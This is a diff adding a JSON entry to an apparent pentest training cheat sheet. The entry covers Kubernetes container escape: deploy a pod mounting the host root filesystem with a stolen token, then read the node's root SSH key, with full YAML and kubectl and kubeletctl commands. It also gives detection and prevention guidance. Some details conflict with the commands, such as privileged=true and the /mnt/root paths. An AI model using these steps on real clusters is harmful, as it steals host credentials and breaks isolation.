@@ -1,0 +1,107 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "https"
+  ],
+  "tools": [
+    "kubectl",
+    "kubeletctl"
+  ],
+  "tags": [
+    "kubernetes",
+    "privileged-pod",
+    "host-mount"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Kubernetes",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Pod spec mounts host / via hostPath at /root",
+      "command": "# privesc.yaml: volumes.hostPath.path: /  ->  mountPath: /root ; automountServiceAccountToken: true"
+    },
+    {
+      "label": "Deploy the privileged pod",
+      "command": "kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 apply -f privesc.yaml"
+    },
+    {
+      "label": "Confirm it's running",
+      "command": "kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 get pods"
+    },
+    {
+      "label": "Read the node's root SSH key through the pod",
+      "command": "kubeletctl --server <ip> exec \"cat /root/root/.ssh/id_rsa\" -p privesc -c privesc"
+    }
+  ],
+  "notes": "If the stolen token can create pods, deploy one with a hostPath volume mounting the node's / - that reads root's files (e.g. SSH key) straight off the host, escaping the cluster.",
+  "references": [
+    {
+      "title": "Kubernetes",
+      "url": "https://kubernetes.io/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "k8s-rce-token",
+      "note": "Provides the token used to create this pod.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "k8s-privileged-pod",
+  "name": "Kubernetes - Deploy Privileged Pod (Host Mount)",
+  "command": "kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 apply -f privesc.yaml",
+  "description": "If the token can create pods, deploy one that mounts the host root filesystem (hostPath /), then exec into it to read the node's root SSH key or write to the host.",
+  "steps": [
+    {
+      "label": "1. privesc.yaml (mount host / into pod)",
+      "command": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privesc\n  namespace: default\nspec:\n  containers:\n  - name: privesc\n    image: nginx:1.14.2\n    volumeMounts:\n    - mountPath: /root\n      name: mount-root-into-mnt\n  volumes:\n  - name: mount-root-into-mnt\n    hostPath:\n      path: /\n  automountServiceAccountToken: true\n  hostNetwork: true"
+    },
+    {
+      "label": "2. Deploy and verify",
+      "command": "kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml\nkubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods"
+    },
+    {
+      "label": "3. Read node root SSH key",
+      "command": "kubeletctl --server 10.129.10.11 exec \"cat /root/root/.ssh/id_rsa\" -p privesc -c privesc"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1610",
+    "T1611"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "A Kubernetes pod with security.privileged=true runs with host-level privileges. With a hostPath volume mounting /, the container has read/write access to the entire host filesystem. An attacker with pod creation rights can deploy such a pod and read /root/.ssh/id_rsa, /etc/shadow, or write to /etc/cron.d to escape to the host.",
+    "prerequisites": "Kubernetes RBAC permissions to create pods (pods/create). No pod security policies (PodSecurityPolicy deprecated, replaced by OPA/Kyverno). Access to kubectl with a valid service account token.",
+    "impact": "Full host filesystem access from within a container. Read SSH keys, shadow files, kubeconfig. Write cron jobs, SSH authorized_keys for persistent root access on the underlying node.",
+    "detection": "Kubernetes audit log: pod creation with privileged=true and hostPath / mount. SIEM: alert on privileged pod creation. OPA/Kyverno policy violation if enforcement is active.",
+    "artifacts": "Kubernetes audit log (kubectl apply privesc.yaml) | Container runtime log (privileged container started) | File access log (reads to /mnt/root/root/)",
+    "prevention": "Enforce Pod Security Standards (Restricted or Baseline) via admission controllers. Use OPA/Kyverno policies to deny pods with privileged=true or hostPath mounts. Use PodSecurityContext with runAsNonRoot=true, readOnlyRootFilesystem=true. Restrict pod creation RBAC to trusted namespaces only.",
+    "misconfiguration": "Kubernetes cluster allows privileged pod creation with host filesystem mounts. No admission controller enforcing Pod Security Standards. Service account tokens have pods/create permission at cluster level.",
+    "vulnerable_config": "# Insecure pod spec\napiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - securityContext:\n      privileged: true  # full host access\n  volumes:\n  - hostPath:\n      path: /   # entire host filesystem\n\n# No PodSecurityPolicy / OPA admission controller",
+    "secure_config": "# Enforce Pod Security Standards\n# namespace label\nkubectl label namespace default \\\n  pod-security.kubernetes.io/enforce=restricted\n\n# OPA/Kyverno policy\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nspec:\n  rules:\n  - name: restrict-privileged\n    match:\n      resources: {kinds: [Pod]}\n    validate:\n      deny:\n        conditions:\n          - key: \"{{request.object.spec.containers[].securityContext.privileged}}\"\n            operator: Equals\n            value: true",
+    "sources": [
+      "HTB M25",
+      "MITRE T1610",
+      "MITRE T1611"
+    ]
+  }
+}
